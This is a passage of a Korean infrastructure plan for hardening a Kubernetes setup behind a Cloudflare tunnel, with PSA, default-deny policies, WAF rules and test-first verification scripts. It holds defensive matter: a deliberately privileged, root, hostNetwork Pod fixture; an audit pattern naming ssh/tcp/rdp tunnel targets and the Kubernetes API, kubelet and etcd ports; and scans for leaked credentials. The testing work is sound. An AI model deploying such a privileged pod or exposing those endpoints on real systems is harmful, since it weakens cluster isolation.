### Task 7: 네임스페이스 5개 — PSA restricted, default-deny, DNS(N1)

**Files:**
- Create: `k8s/base/namespaces/{kustomization.yaml, namespaces.yaml, netpol-default-deny.yaml, netpol-allow-dns.yaml}`, `tests/fixtures/psa-violation.yaml`, `scripts/verify/m1-psa.sh`

**Interfaces:**
- Produces:
  - 네임스페이스 `pii-relay safedesk minishop openbao audit-anchor`. 라벨 `pod-security.kubernetes.io/enforce: restricted`, `enforce-version: latest`, `audit`·`warn`도 `restricted`.
  - 각 ns의 `NetworkPolicy`: `default-deny`(`podSelector: {}`, `policyTypes: [Ingress, Egress]`), `allow-dns-egress`(N1: `kube-system`의 `k8s-app: kube-dns` Pod로 53 UDP/TCP). **`allow-acme-solver-ingress`(N5)는 만들지 않는다** (DNS-01). 정책 이름은 이후 고치지 않고 허용 정책만 추가한다.
  - `psa-violation.yaml`은 `privileged: true`, `hostNetwork: true`, root 실행을 넣은 Pod.

- [ ] **Step 1: 실패하는 검증 작성** `m1-psa.sh`. 5개 ns 각각:
  - `assert_fails_with "PSA rejects privileged pod in <ns>" --rc 1 --match 'violates PodSecurity "restricted:' -- kubectl apply --dry-run=server -n <ns> -f tests/fixtures/psa-violation.yaml`
  - `kubectl get netpol -n <ns> -o name` 정렬 결과 = `allow-dns-egress default-deny`
  - N5 잔재 없음: `assert_fails_with "no acme solver policy in <ns>" --rc 1 --match 'Error from server \(NotFound\)' -- kubectl get netpol allow-acme-solver-ingress -n <ns>`
- [ ] **Step 2:** FAIL 확인 (ns 없음).
- [ ] **Step 3:** 매니페스트 작성, `kubectl apply -k k8s/base/namespaces`.
- [ ] **Step 4:** PASS 확인.
- [ ] **Step 5: kubelet 프로브 확인 (Review Focus 6)**
  1. `safedesk` ns에 restricted를 지키고 readiness probe가 있는 임시 Pod를 띄운다 (Task 8의 더미 이미지).
  2. 60초 안에 `Ready=True`가 되는지 확인한다.
  3. 안 되면 `allow-kubelet-probes` 정책(노드 IP/32 → 해당 포트 ingress, `ipBlock`)을 5개 ns 모두에 추가하고 결과를 부록 A에 기록한다.
  4. 결과가 어느 쪽이든 `docs/evidence/m1/kubelet-probe.md`에 남긴다.
- [ ] **Step 6: 커밋** `feat(k8s): five namespaces with PSA restricted and default-deny NP`

---

### Task 8: 더미 앱 3개, 미들웨어(body-limit 포함), 원본 HTTPS (staging → prod)

더미는 이후 실제 앱이 같은 라벨과 포트를 이어받는 자리다. N2, N3, N4는 지금 실제 이름으로 만든다 (기존 Claude 결정 유지). 실제 앱은 공개 모드 통제가 검증된 뒤에만 이 호스트에 연결한다 (Q16).

**Files:**
- Create: `k8s/components/traefik-middlewares/{kustomization.yaml, redirect.yaml, sec-headers.yaml, body-limit.yaml}`, `k8s/base/dummy/{kustomization.yaml, deploy.yaml, service.yaml, ingress.yaml, certificate.yaml, netpol-allow-traefik.yaml}`, `k8s/overlays/local/kustomization.yaml`, `scripts/cert/promote-prod.sh`, `scripts/verify/m1-origin.sh`

**Interfaces:**
- Consumes: ClusterIssuer(Task 5), ns·정책(Task 7), `HOST_*`, `node_ip`, `vm_run`
- Produces:

  | ns | Deployment/Service = `app.kubernetes.io/name` | 포트 | 호스트 | NP |
  |---|---|---|---|---|
  | `safedesk` | `safedesk-app` | 8000 | `safedesk.whoareryu.cloud` | N2 |
  | `minishop` | `minishop-app` | 8000 | `minishop.whoareryu.cloud` | N3 |
  | `pii-relay` | `relay-reveal` | 8001 | `relay.whoareryu.cloud` | N4 |

  - 미들웨어(각 ns): `https-redirect`, `sec-headers`, `body-limit`(Traefik `buffering`, `maxRequestBodyBytes: 65536` — Q19). 어노테이션 `<ns>-https-redirect@kubernetescrd,<ns>-sec-headers@kubernetescrd,<ns>-body-limit@kubernetescrd`. `console-ipallow`(IP 허용 목록)는 만들지 않는다 — relay 콘솔은 에지 R2 Managed Challenge + rate limit + 상담원 TOTP(M4)로 보호한다.
  - `Certificate` `<app>-tls` (DNS-01, `dnsNames`는 호스트 하나). Ingress의 `tls.secretName`이 이를 참조한다 (ingress-shim 어노테이션 대신 명시적 Certificate — overlay에서 issuer 패치가 쉬움 **[Claude 결정]**).
  - 더미 응답 본문 (Q14 A): 고정 문자열 `"<app> placeholder — 합성 데이터 데모입니다. 실제 개인정보를 입력하지 마세요."` 요청 헤더·Pod IP를 되돌려주지 않는다.
  - `promote-prod.sh`: 세 Certificate가 staging 발급자로 `Ready=True`일 때만 overlay issuer를 `letsencrypt-prod`로 바꿔 적용. 아니면 stderr `promote-prod: not Ready: <이름...>`, exit 1.
  - `m1-origin.sh [--issuer staging|prod]` — **VM 안에서**(`vm_run`) `curl --resolve <host>:443:$NODE_IP`로 원본(Traefik)을 직접 검사. 공개 경로 검사는 Task 9·10.

- [ ] **Step 1: 실패하는 검증 작성** `m1-origin.sh`. 세 호스트 각각:
  - HTTP(80) → 301, `Location: https://` (원본 리다이렉트. 에지 리다이렉트는 Task 10에서 따로)
  - HTTPS 200 (`staging`이면 `-k`, `prod`이면 시스템 CA로 검증)
  - `--issuer staging`일 때 검증 모드 실패가 **인증서 때문**인지: `assert_fails_with "staging cert not publicly trusted" --rc 60 --match '^curl: \(60\)' -- curl -sS --resolve <host>:443:$NODE_IP https://<host>/`
  - 헤더: HSTS, nosniff, no-referrer, DENY, CSP 전체 문자열이 Global Constraints 값과 같음, 응답 헤더를 파일로 받은 뒤 `assert_fails_with "no origin server header" --rc 1 -- grep -Eqi '^server:' "$tmp/h"`
  - `--issuer prod`: `openssl s_client -servername <host> -connect $NODE_IP:443`의 issuer에 `Let's Encrypt` 포함, `(STAGING)` 미포함
  - 본문에 "실제 개인정보를 입력하지 마세요" 포함
  - **body-limit (Q19):** 60000바이트 POST → 200 (양성 대조). 70000바이트 POST → `assert_fails_with "body over 64KiB rejected at origin" --rc 22 --match 'returned error: 413' -- curl -sS -f -k --resolve <host>:443:$NODE_IP --data-binary @$tmp/70k https://<host>/`
- [ ] **Step 2:** `m1-origin.sh --issuer staging` → FAIL 확인.
- [ ] **Step 3:** 더미 Deployment: arm64 non-root 고정 문구 정적 응답 서버 (후보 `hashicorp/http-echo` `-listen=:8000 -text=...`. 실행 시 arm64 지원, 비루트 UID로 실행 가능 여부, 모든 경로·POST에 같은 응답을 주는지, digest를 확인해 `VERSIONS.md`에 기록. 조건을 못 맞추면 같은 성질의 다른 이미지로 바꾸고 이유를 기록). securityContext는 §15 전부(`runAsNonRoot`, 고정 UID, `allowPrivilegeEscalation: false`, `capabilities.drop: [ALL]`, `seccompProfile: RuntimeDefault`, `readOnlyRootFilesystem: true`), `automountServiceAccountToken: false`, resources `16Mi/10m`~`32Mi/100m`, readinessProbe HTTP GET `/`.
- [ ] **Step 4:** 미들웨어 component (CSP `form-action`은 overlay에서 `https://$HOST_RELAY` 주입, `customResponseHeaders: {Server: ""}`, `body-limit`).
- [ ] **Step 5:** `netpol-allow-traefik.yaml`(N2/N3/N4): `kube-system`의 `app.kubernetes.io/name: traefik` → 표의 Pod·포트만. relay-reveal은 8001만.
- [ ] **Step 6:** `kubectl apply -k k8s/overlays/local` (issuer `letsencrypt-staging`) → Certificate Ready 대기(DNS-01 전파 포함, 최대 10분) → `m1-origin.sh --issuer staging` PASS → `m1-dns-baseline.sh` PASS(잔여 TXT 없음, apex/www 불변).
- [ ] **Step 7 (Review Focus 5):** Certificate 하나를 지운 상태에서 `assert_fails_with "promote refuses when not all staging Ready" --rc 1 --match 'promote-prod: not Ready: .*-tls' -- scripts/cert/promote-prod.sh` → overlay 재적용으로 복구, Ready 대기.
- [ ] **Step 8:** `promote-prod.sh` → `m1-origin.sh --issuer prod` PASS.
- [ ] **Step 9:** `m1-traefik.sh` 재실행 → Task 6에서 남긴 항목까지 전부 PASS.
- [ ] **Step 10:** (선택) VM 안에서 `testssl.sh --quiet --severity MEDIUM --ip $NODE_IP https://$HOST_RELAY` → `docs/evidence/m1/testssl-origin-relay.txt` (`scrub_evidence` 후).
- [ ] **Step 11: 커밋** `feat(ingress): dummy apps with DNS-01 certificates, security headers, body-limit, N2-N4`

---

### Task 9: cloudflared 이름 있는 터널 (VM 호스트)과 터널 경유 공개 HTTPS

**Files:**
- Create: `scripts/host/install-cloudflared.sh`, `scripts/host/cloudflared/config.yml.tmpl`, `scripts/host/systemd/cloudflared.service`, `scripts/verify/lib/tunnelcfg.sh`, `tests/scripts/test_tunnelcfg.sh`, `tests/scripts/fixtures/tunnel-{good,notlsverify,extra-svc,no-catchall,no-servername,extra-host}.yml`, `scripts/verify/lib/http.sh`, `tests/scripts/test_edge_class.sh`, `tests/scripts/fixtures/edge-hdr-*.txt`, `scripts/verify/m1-tunnel.sh`, `docs/runbooks/m1-tunnel.md`

**Interfaces:**
- Consumes: Task 8의 prod 인증서, `node_ip`, `env.sh` (`TUNNEL_NAME`, `TUNNEL_ID`, `HOST_*`, `CF_ZONE`)
- Produces:
  - VM `/etc/cloudflared/config.yml`(템플릿 렌더, root 644, UUID 포함이라 저장소에는 템플릿만) + `/etc/cloudflared/<TUNNEL_ID>.json`(root:cloudflared 640, **유일한 사본** — Q22). `cert.pem`은 VM에 두지 않고 Mac에서도 삭제한다 (Q2).
  - 템플릿 ingress (순서 고정, Q3 A 로컬 관리형):
    ```yaml
    tunnel: ${TUNNEL_ID}
    credentials-file: /etc/cloudflared/${TUNNEL_ID}.json
    no-autoupdate: true
    metrics: 127.0.0.1:20241
    ingress:
      - hostname: ${HOST_SAFEDESK}
        service: https://${NODE_IP}:443
        originRequest: { originServerName: ${HOST_SAFEDESK} }
      - hostname: ${HOST_MINISHOP}
        service: https://${NODE_IP}:443
        originRequest: { originServerName: ${HOST_MINISHOP} }
      - hostname: ${HOST_RELAY}
        service: https://${NODE_IP}:443
        originRequest: { originServerName: ${HOST_RELAY} }
      - service: http_status:404
    ```
    `protocol`은 기본 `auto`(QUIC, UDP 실패 시 http2) 유지.
  - `scripts/verify/lib/tunnelcfg.sh`: `audit_tunnel_config <file> <host1> <host2> <host3>` — 다음을 모두 만족하면 0, 아니면 위반 줄을 출력하고 1: `service:` 줄이 정확히 4개, 마지막이 `http_status:404`, 나머지 3개는 `https://<IP>:443`만, 각 `hostname`에 같은 값의 `originServerName`, `noTLSVerify: true` 없음, `ssh://|tcp://|rdp://|unix:|:6443|:10250|:2379` 없음, `hostname`이 인자로 받은 세 값 외에 없음.
  - `scripts/verify/lib/http.sh`:
    - `edge_class <status> <headers_file>` — `cf-mitigated: challenge` 헤더가 있으면 `CHALLENGED`, 아니면 2xx/3xx `OK`, 403 `BLOCKED`, 429 `RATE_LIMITED`, 그 밖 `OTHER`.
    - `edge_fetch <url> [curl args...]` — `curl -sS -f --max-time 15 -o "$EDGE_BODY" -D "$EDGE_HDRS" -w '%{http_code}'`로 실행하고, stderr에 curl 오류와 함께 `EDGE_STATUS=<code>`, `EDGE_CLASS=<class>`, `EDGE_RAY=<cf-ray 값>` 줄을 남기며 curl의 rc를 그대로 반환한다. `assert_fails_with --match '^EDGE_CLASS=BLOCKED$'`처럼 원인을 판정할 수 있다.
  - systemd 유닛 하드닝: `User=cloudflared`, `NoNewPrivileges=yes`, `ProtectSystem=strict`, `ProtectHome=yes`, `PrivateTmp=yes`, `CapabilityBoundingSet=`, `RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX`, `Restart=on-failure`.

- [ ] **Step 1: 실패하는 테스트 작성**
  - `test_tunnelcfg.sh`: `good` → 0, `notlsverify`/`extra-svc`(6443 추가)/`no-catchall`/`no-servername`/`extra-host` → 각각 rc 1과 해당 위반 메시지 (`assert_fails_with --rc 1 --match '<위반 메시지>'`).
  - `test_edge_class.sh`: fixture 헤더(`200`, `403` 차단, `403` + `cf-mitigated: challenge`, `429`, `502`) → `OK BLOCKED CHALLENGED RATE_LIMITED OTHER`.
- [ ] **Step 2:** FAIL → `audit_tunnel_config`, `edge_class`, `edge_fetch` 구현(awk, bash 3.2) → PASS.
- [ ] **Step 3: 실패하는 검증 작성** `m1-tunnel.sh` ((VM) 항목은 보조 스크립트를 `vm_run --root`로 실행하고 첫 assert로 `id -u` = 0 확인):
  - (repo) 템플릿을 더미 값으로 렌더해 `audit_tunnel_config` 0
  - (VM) `systemctl is-active cloudflared` = `active`, `is-enabled` = `enabled`
  - (VM) `cloudflared tunnel --config /etc/cloudflared/config.yml ingress validate` rc 0
  - (VM) `cloudflared tunnel --config ... ingress rule https://<각 호스트>/` 출력에 `https://<NODE_IP>:443`
  - (VM) catch-all: `https://kube.$CF_ZONE/`, `https://$CF_ZONE/`, `https://www.$CF_ZONE/`, `https://localhost/` 각각 `ingress rule` 출력에 `http_status:404`
  - (VM) 배포된 설정도 `audit_tunnel_config` 0, 파일 권한 640/644, 소유자 확인
  - (VM) `curl -sS 127.0.0.1:20241/ready` → 200
  - (VM) metrics가 루프백 전용: `ss -Hltn 'sport = :20241'` 출력을 `$tmp/ss`로 받고 rc 0과 **파일이 비어 있지 않음**(리스너가 실제로 있음 — 바로 위 `/ready` 200과 같은 사실을 소켓 수준에서 확인)을 assert한 뒤 `assert_fails_with "cloudflared metrics loopback only" --rc 1 -- grep -Ev '127\.0\.0\.1:20241' "$tmp/ss"`
  - (VM, `vm_run --root`, 첫 assert는 `id -u` = 0) `cert.pem` 없음: 검색 대상 `/etc/cloudflared /root /home /usr/local/etc/cloudflared` 중 존재하는 것만 고르고(`/etc/cloudflared`, `/root`, `/home`은 반드시 존재해야 함을 `test -d`로 assert), `find <대상들> -maxdepth 4 -name cert.pem > $tmp/vm-cert`를 stderr를 버리지 않고 실행해 **rc 0**을 assert(권한 오류가 있으면 rc 1로 드러남)한 뒤 `assert_fails_with "no account cert on VM" --rc 1 -- grep -Eq . "$tmp/vm-cert"`
  - (Mac) **Q2·Q22:** cloudflared가 찾는 기본 위치 전부(`~/.cloudflared`, `~/.cloudflare-warp`, `~/cloudflare-warp`, `/etc/cloudflared`, `/usr/local/etc/cloudflared`, `/opt/homebrew/etc/cloudflared`) 중 존재하는 디렉터리에서 `find <있는 것들> -maxdepth 1 \( -name cert.pem -o -name '*.json' \) > $tmp/mac-cf` 실행 rc 0 assert(존재하는 디렉터리가 하나도 없으면 빈 파일을 만들고 그 사실을 출력) → `assert_fails_with "no cert.pem or tunnel credentials on Mac" --rc 1 -- grep -Eq . "$tmp/mac-cf"`
  - (Mac, 공개 경로) 세 호스트 `edge_fetch https://<host>/` → rc 0, `EDGE_CLASS=OK`, 본문에 "실제 개인정보를 입력하지 마세요", 헤더에 `cf-ray`, HSTS·CSP 등 원본 헤더 통과, `server` 헤더 값이 `cloudflare`뿐
  - (Mac) **6443 비노출:** `edge_fetch https://$HOST_SAFEDESK/version` → rc 0, 200, 본문이 더미 문자열(양성 대조) → `assert_fails_with "no k8s API via public host" --rc 1 -- grep -Fq gitVersion "$EDGE_BODY"`
  - (Mac) **비표준 포트:** `assert_fails_with "6443 not proxied by edge" --match '^curl: \((7|28|35|52|56)\)' -- curl -sS --max-time 8 https://$HOST_SAFEDESK:6443/` (Cloudflare는 6443을 프록시하지 않음. 실제 rc를 증거에 기록)
  - (Mac) **없는 호스트:** `assert_fails_with "random subdomain does not resolve" --rc 6 --match '^curl: \(6\)' -- curl -sS --max-time 5 https://nope-$RANDOM.$CF_ZONE/` (와일드카드 레코드가 없다는 전제. 있으면 FAIL로 드러남)
  - (VM) **원본 검증 음성 대조:** `assert_fails_with "wrong origin name fails TLS" --rc 35 --match 'alert unrecognized name' -- curl -sS --resolve wrong.$CF_ZONE:443:$NODE_IP https://wrong.$CF_ZONE/` (Task 6과 같은 문자열. 실행 시 확인한 실제 문자열이 다르면 두 곳을 함께 바꾼다)
  - (Mac) `m1-exposure.sh --stage tunnel` PASS (cloudflared가 Mac 쪽 리스너를 늘리지 않음)
- [ ] **Step 4:** 실행 → FAIL 확인 (터널 없음).
- [ ] **Step 5 (MANUAL, 사용자, Mac):** 런북 `m1-tunnel.md` (Q3 A — CLI만 사용, 대시보드·Zero Trust 온보딩으로 만들지 않음):
  1. `brew install cloudflared`(버전 기록) → `cloudflared tunnel login` (브라우저에서 zone `whoareryu.cloud` 선택, `~/.cloudflared/cert.pem` 생성. 계정 수준 권한이므로 VM으로 복사하지 않는다). `cert.pem`의 머리줄 형식만 확인해 Task 2 Step 0의 gitleaks 규칙을 확정한다 (값은 기록하지 않음).
  2. `cloudflared tunnel create $TUNNEL_NAME` → UUID를 `config/cluster.env`의 `TUNNEL_ID`에만 기록
  3. `cloudflared tunnel route dns $TUNNEL_NAME safedesk.whoareryu.cloud` (minishop, relay도). DNS 탭에서 세 CNAME(`<TUNNEL_ID>.cfargotunnel.com`, 프록시됨)만 추가됐고 apex/www가 그대로인지 캡처 (UUID는 가림)
  4. 자격 증명 JSON을 `limactl copy`로 VM `/tmp/`에 보낸다
  5. **Q2 A:** `rm ~/.cloudflared/cert.pem` (이후 DNS 라우팅 추가·터널 삭제가 필요하면 다시 `tunnel login` 후 같은 방식으로 삭제)
  6. **Q22 A:** Step 6에서 VM 설치가 성공한 뒤 Mac의 `~/.cloudflared/<TUNNEL_ID>.json`을 삭제한다. 백업하지 않는다. VM 재생성 등으로 잃으면 `tunnel delete` → `create` → `route dns`를 다시 한다 (런북에 절차).
- [ ] **Step 6:** VM에서 `sudo bash install-cloudflared.sh`: 고정 버전 arm64 `.deb`(GitHub 릴리스, sha256 확인) 설치, `cloudflared` 시스템 사용자 생성, `/tmp`의 JSON을 `/etc/cloudflared/`로 이동(640) 후 `/tmp` 사본 삭제, 템플릿 렌더(`TUNNEL_ID`, `NODE_IP`, `HOST_*`), `audit_tunnel_config` 통과 시에만 systemd 유닛 설치·enable·start. 감사 실패 시 exit 1, 서비스 시작 안 함.
- [ ] **Step 7 (신뢰 프록시 실측):** `vm_run --root`로 `/var/log/traefik/access.log`의 터널 경유 요청에서 `ClientHost`(cloudflared 연결의 출발 주소)를 확인해 Task 6의 `trustedIPs` **[Claude 제안]**을 그 /32로 확정한다. 초기값 `<NODE_IP>/32`와 다르면 갱신 후 재적용하고 `docs/evidence/m1/trusted-proxy.md`에 실측값(`<NODE_IP>`·`<CNI_GW>` 같은 자리표시자로)과 이유를 기록한다. 터널 경유 요청 로그에 `Cf-Connecting-Ip`가 Mac의 공인 IP와 같은지 확인 (증거에는 `<HOME_IP>`).
- [ ] **Step 8:** `m1-tunnel.sh` PASS, `m1-traefik.sh` PASS, `m1-dns-baseline.sh` PASS.
- [ ] **Step 9:** 터널 이그레스 기록: `vm_run --root`로 `ss -tunp > $tmp/ss-all` 성공 assert 후 cloudflared 줄을 골라 원격 포트가 7844(UDP=QUIC 또는 TCP=http2)인지 `docs/evidence/m1/tunnel-egress.txt`에 남긴다 (`scrub_evidence` 후. 원격 IP는 Cloudflare 주소라 공개 정보지만 로컬 주소는 가림). 로컬에는 호스트 방화벽이 없으므로(Q13) 이그레스 규칙은 없다.
- [ ] **Step 10: 커밋** `feat(tunnel): host cloudflared named tunnel, three hosts to traefik with origin verification`

---

### Task 10: Cloudflare 에지 통제, 설정 내보내기, 국가 차단 외부 관측

**Files:**
- Create: `docs/runbooks/m1-cloudflare-edge.md`, `scripts/verify/m1-edge.sh`, `scripts/cf/export-config.sh`, `scripts/cf/check-export-clean.sh`, `tests/scripts/test_check_export_clean.sh`, `docs/evidence/m1/cloudflare-edge/config-export.json`, `tests/scripts/test_cf_export_normalize.sh`, `tests/scripts/fixtures/cf-export-*.json`, `scripts/verify/edge-geo-probe.sh`, `.github/workflows/edge-geo-probe.yml`, `docs/evidence/m1/cloudflare-edge/*.png`, `docs/evidence/m1/csp-js-detections.md`
- Modify: `.pre-commit-config.yaml`(export 정리 훅), `scripts/verify/lib/cfapi.sh`(`cf_api_ro` 추가), `tests/scripts/test_gitleaks_rules.sh`, `tests/scripts/test_check_cluster_values.sh`

**Interfaces:**
- Consumes: Task 9 공개 경로, `edge_fetch`/`edge_class`
- Produces: 아래 규칙 이름은 대시보드에서 그대로 쓴다 (내보내기·증거 캡처와 대조용). 커스텀 규칙 배분은 Q10, rate limit은 Q9, 캐시는 Q15.

  | 종류 | 이름 | 식(요지) | 동작 |
  |---|---|---|---|
  | WAF custom R1 | `sax-geo-kr-only` | `http.host in {세 호스트} and ip.src.country ne "KR"` | Block |
  | WAF custom R2 | `sax-relay-console-challenge` | `http.host eq "relay.whoareryu.cloud" and starts_with(http.request.uri.path, "/console")` | Managed Challenge |
  | WAF custom R3 | `sax-signup-block` | `http.host in {세 호스트} and starts_with(http.request.uri.path, "/signup")` | Block (공개 모드 가입 비활성의 에지 이중화) |
  | WAF custom R4 | `sax-method-allowlist` | `http.host in {세 호스트} and not http.request.method in {"GET" "HEAD" "POST"}` | Block |
  | R5 | 예비 (비워 둠) | | |
  | Rate limiting (무료 1개) | `sax-sensitive-paths` | (경로 목록은 **[Claude 제안]** — 사용자 결정은 "민감 경로") `http.host in {세 호스트} and (starts_with(path,"/login") or starts_with(path,"/admin/login") or starts_with(path,"/consent") or starts_with(path,"/console"))`, IP 기준 | **10초에 5회 초과 → Block 10초** (Q9) |
  | Managed rules | Cloudflare Free Managed Ruleset | 기본 | 켬 |
  | Bots | Bot Fight Mode | zone 전역 (프록시 레코드 = 세 호스트에만 적용) | 켬 |
  | Cache rule | `sax-bypass-cache` | `http.host in {세 호스트}` | Bypass cache (Q15) |
  | SSL/TLS | 모드 Full (strict), Always Use HTTPS, Minimum TLS 1.2, TLS 1.3 켬 | | |
  | Speed | Rocket Loader 끔, Email Obfuscation 끔 (HTML 변형 방지) | | |

  규칙 이름과 식의 세부(경로 목록, 메서드 식 표기)는 **[Claude 제안]**이고, 배분·동작·임계값은 Q9·Q10·Q15 사용자 결정이다.
  Free 플랜 대시보드가 위 식의 일부 함수(`starts_with` 등)를 받지 않으면 같은 의미의 허용된 식으로 바꾸고 런북에 기록한다 (의미 변경 금지).
  - `scripts/cf/export-config.sh` (Q7 B, 결정 N2a·N2b) — 읽기 전용 토큰(키체인 서비스 `secure-ax-cf-readonly`, `curl -4`)으로 zone 설정(ssl, always_use_https, min_tls_version, tls_1_3, rocket_loader, email_obfuscation), Bot Fight Mode 상태, ruleset 진입점(custom, ratelimit, managed, cache settings), DNS 레코드(apex, www, 세 호스트)를 받아 jq로 정규화한다: ID·타임스탬프·zone/account 식별자·수정자 이메일 제거, DNS 레코드는 `type`·`name`·`proxied`만 남기고 `content`는 버림(apex/www의 Vercel IP는 `dns-baseline.txt`가 따로 가짐), 터널 CNAME은 `<TUNNEL_ID>.cfargotunnel.com`으로 표시. 결과는 키 정렬(`jq -S`)해 **`docs/evidence/m1/cloudflare-edge/config-export.json`으로 커밋**하는 드리프트 기준선이 된다. 원본 응답은 `docs/evidence/m1/cf-export-raw/`(gitignore)에만.
  - `scripts/verify/lib/cfapi.sh`에 `cf_api_ro <METHOD> <path> [json-body]` 추가 — `cf_api`와 같은 구현(`curl -4`, 토큰은 stdin 전달, 출력 금지)이고 키체인 서비스만 `secure-ax-cf-readonly`. `export-config.sh`는 이것만 쓴다.
  - `scripts/cf/check-export-clean.sh <file>` (결정 N2b) — 커밋 전 부재 검사. 다음 중 하나라도 있으면 해당 종류 이름만 출력(값은 출력하지 않음)하고 exit 1: 32자리 16진 ID(계정/zone/ruleset ID), UUID, 이메일 주소, IPv4/IPv6 주소, 40자 이상 토큰 모양 문자열, `config/cluster.env`의 비공개 값(`TUNNEL_ID`, `ACME_EMAIL`). `.pre-commit-config.yaml`에 이 파일 경로(`^docs/evidence/m1/cloudflare-edge/config-export\.json$`)에만 도는 local 훅으로 등록.
  - `m1-edge.sh`는 정규화 결과로 설정 사실을 검사하고, 공개 경로로 동작을 검사한다.
  - `.github/workflows/edge-geo-probe.yml` (Q8 B) — `on: workflow_dispatch`만, `permissions: contents: read`, 비밀·토큰 사용 없음, `runs-on: ubuntu-24.04`, `actions/checkout`은 전체 커밋 SHA 고정. `bash scripts/verify/edge-geo-probe.sh <세 호스트>` 실행 후 결과를 Job Summary에 출력. 정기 실행(schedule) 없음.
  - `scripts/verify/edge-geo-probe.sh` — (1) `https://www.cloudflare.com/cdn-cgi/trace`의 `loc=`로 러너 국가 기록, `loc=KR`이면 `INCONCLUSIVE(runner in KR)`로 끝냄 (2) 세 호스트 `/`에 `edge_fetch` (3) 각 결과를 `GEO_BLOCKED`(BLOCKED), `BOT_CHALLENGED`(CHALLENGED), `SERVED`(OK), `OTHER`로 분류해 cf-ray와 함께 출력 (4) 합계 줄 `GEO_BLOCKED=n BOT_CHALLENGED=m SERVED=k`.

- [ ] **Step 1: 실패하는 테스트 작성**
  - `test_cf_export_normalize.sh`: 가짜 API 응답 fixture(가짜 ID·UUID·이메일·IP를 실행 중 생성) → 정규화 결과에 ID·UUID·이메일·IP·DNS `content`가 없고 `<TUNNEL_ID>` 표시가 있으며 규칙 이름·식·동작은 남음.
  - `test_check_export_clean.sh`: 깨끗한 정규화 결과 → rc 0. 각 누출 종류를 하나씩 심은 파일(실행 중 생성) → 예: `assert_fails_with "zone id detected" --rc 1 --match '^check-export-clean: hex-id' -- scripts/cf/check-export-clean.sh "$tmp/hex.json"` (uuid, email, ipv4, ipv6, token, cluster-env 값도 같은 방식). 출력에 심은 값이 없음을 `assert_fails_with --rc 1 -- grep -Fq "<심은 값>" "$tmp/out"`로 확인.
  - 기존 훅이 명백한 누출을 잡는지: `test_gitleaks_rules.sh`에 내보내기 JSON 모양 파일에 가짜 Cloudflare 토큰을 심은 양성 케이스 추가, `test_check_cluster_values.sh`에 `TUNNEL_ID` 값이 든 `config-export.json` staged 케이스 추가 (`--rc 1 --match 'value of TUNNEL_ID'`).
  - FAIL → 정규화 함수, `check-export-clean.sh`, pre-commit 훅 등록 → PASS.
- [ ] **Step 2: 실패하는 검증 작성** `m1-edge.sh` (Mac, KR에서 실행):
  - **설정 사실 (Q7, 내보내기 기반):** custom 규칙 이름이 정확히 R1~R4 네 개이고 각 식에 세 호스트 제한이 있음, R1 동작 block·R2 managed_challenge·R3 block·R4 block. rate limit 규칙 하나: 기간 10, 요청 5, 완화 10, 동작 block. Free Managed Ruleset 배포됨. Bot Fight Mode 켬. cache 규칙이 세 호스트 bypass. ssl = strict, min_tls 1.2, always_use_https on, rocket_loader off, email_obfuscation off. apex/www 레코드 `proxied=false`
  - **드리프트 (결정 N2b):** 새로 내보낸 정규화 결과를 `$tmp/now.json`에 저장(성공 assert) → 기준선과 새 결과 둘 다 비어 있지 않음을 `assert_succeeds "baseline non-empty" -- jq -e '(.custom_rules|length)>0 and (.ratelimit_rules|length)==1' docs/evidence/m1/cloudflare-edge/config-export.json`와 같은 식의 `now.json` 검사로 확인(키 이름은 정규화 형식에 맞춤) → 둘 다 `check-export-clean.sh` rc 0 → `assert_succeeds "cloudflare config matches committed baseline" -- cmp -s docs/evidence/m1/cloudflare-edge/config-export.json "$tmp/now.json"`
  - **IPv4 강제 (결정 N1):** `export-config.sh`도 `cf_api_ro`(즉 `CF_CURL=(curl -4 ...)`)만 쓰고, 주석을 제외한 줄에서 `curl`을 직접 부르지 않음 (Task 5와 같은 방식의 줄 수 검사)
  - **TLS 하한:** macOS 기본 `curl`(LibreSSL/SecureTransport)은 클라이언트 쪽에서 TLS 1.1을 거부할 수 있으므로(거짓 FAIL), 이 검사는 VM에서 OpenSSL curl로 한다: `vm_run`으로 `assert_fails_with "edge refuses TLS1.1" --rc 35 --match 'alert protocol version' -- curl -sS --tlsv1.1 --tls-max 1.1 --ciphers 'DEFAULT@SECLEVEL=0' https://$HOST_SAFEDESK/` + 같은 곳에서 양성 대조 `--tls-max 1.2` → 200
  - **HTTP→HTTPS:** `curl -sS -o /dev/null -D $tmp/h http://$HOST_SAFEDESK/` → 301, `Location: https://`
  - **정상 경로:** 세 호스트 `/` → `EDGE_CLASS=OK` (KR에서 R1에 막히지 않음). 챌린지를 받으면 `BOT_CHALLENGED: <항목>`을 출력하고 FAIL로 센다 (Review Focus 8)
  - **가입 경로 차단(R3):** `assert_fails_with "signup blocked at edge (R3)" --rc 22 --match '^EDGE_CLASS=BLOCKED$' -- edge_fetch https://$HOST_SAFEDESK/signup`
  - **콘솔 챌린지(R2):** 양성 대조 `edge_fetch https://$HOST_RELAY/` → `EDGE_CLASS=OK` 후 `assert_fails_with "relay console challenged (R2)" --rc 22 --match '^EDGE_CLASS=CHALLENGED$' -- edge_fetch https://$HOST_RELAY/console/`
  - **메서드 제한(R4):** `assert_fails_with "PUT blocked at edge (R4)" --rc 22 --match '^EDGE_CLASS=BLOCKED$' -- edge_fetch https://$HOST_MINISHOP/ -X PUT` (OPTIONS, DELETE도 같은 방식), 양성 대조 작은 POST → `EDGE_CLASS=OK`
  - **body-limit 공개 경로 (Q19):** `assert_fails_with "body over 64KiB rejected via edge" --rc 22 --match '^EDGE_STATUS=413$' -- edge_fetch https://$HOST_SAFEDESK/ --data-binary @$tmp/70k`
  - **rate limit (Q9):** `/login`에 3초 안에 8회 GET을 한 묶음으로 보내고 `EDGE_CLASS` 목록에 `RATE_LIMITED`가 있는지 본다. Cloudflare의 집계는 근사치라 한 묶음으로 안 걸릴 수 있으므로 최대 3묶음(묶음 사이 1초)까지 다시 보내고, 그 안에 `RATE_LIMITED`가 나오면 통과 (`assert_contains`). 이어서 바로 `assert_fails_with "rate limited request rejected" --rc 22 --match '^EDGE_CLASS=RATE_LIMITED$' -- edge_fetch https://$HOST_SAFEDESK/login`. **회복:** 25초 대기 후 **같은 `/login`**에 한 번 → `EDGE_CLASS=OK` (차단 10초가 끝났음을 보여 줌. `/`는 rate limit 대상이 아니므로 회복 증거가 되지 않는다)
